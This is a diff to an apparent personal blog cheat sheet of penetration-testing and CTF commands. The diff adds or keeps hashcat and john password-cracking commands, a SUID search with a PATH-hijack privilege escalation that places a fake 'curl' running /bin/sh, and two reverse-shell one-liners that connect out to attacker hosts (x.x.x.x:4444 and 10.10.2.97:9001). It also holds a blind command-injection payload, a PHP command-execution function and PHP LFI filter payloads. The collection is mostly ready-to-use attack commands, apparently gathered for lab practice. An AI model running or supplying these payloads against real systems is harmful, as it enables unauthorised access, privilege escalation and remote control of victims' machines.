@@ -3,31 +3,43 @@ layout: post
 title: Useful Tricks and Tips
 ---
 
-# Hashcat
+#Hashcat
 
 - hashcat -m 1800 -a 0 hash.txt rockyou.txt
 
-# Find command
+#Find command
 
-```sh
+```bash
 find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2>/dev/null
+
+find / -perm -u=s -type f 2>/dev/null
+
+cd /tmp
+echo /bin/sh > curl
+chmod 777 curl 
+export PATH=/tmp:$PATH
+/usr/bin/menu
 ```
+
+<img src="../assets/images/kenobi.png" />
+
 # Upgrading to a shell
-```sh
+
+```bash
 python -c 'import pty;pty.spawn('/bin/bash')'
 SHELL=/bin/bash script -q /dev/null
 ```
 
 # Reverse Shell
 
-```sh
+```bash
 php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f
 ```
 
 # Blind OS injection
 
-```sh
+```bash
 
 ||whoami>/var/www/images/output.txt||
 
@@ -75,9 +87,14 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
 tac data.txt > new_data.txt
 ```
 # Email re
--   email_re = re.compile(r'([a-zA-Z0-9_\+\-\.]+)@(([[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)')
+
+```bash
+
+email_re = re.compile(r'([a-zA-Z0-9_\+\-\.]+)@(([[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)')
+```
 
 ## Php reverse shell function
+
 ```php
 
 function execInBackground($cmd) { 
@@ -92,10 +109,12 @@ function execInBackground($cmd) {
 
 ```
 # PHP LFI
+
+```bash
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
-
+```
 # Practice Labs
 Capture the Flag (CTF) API Portal
 
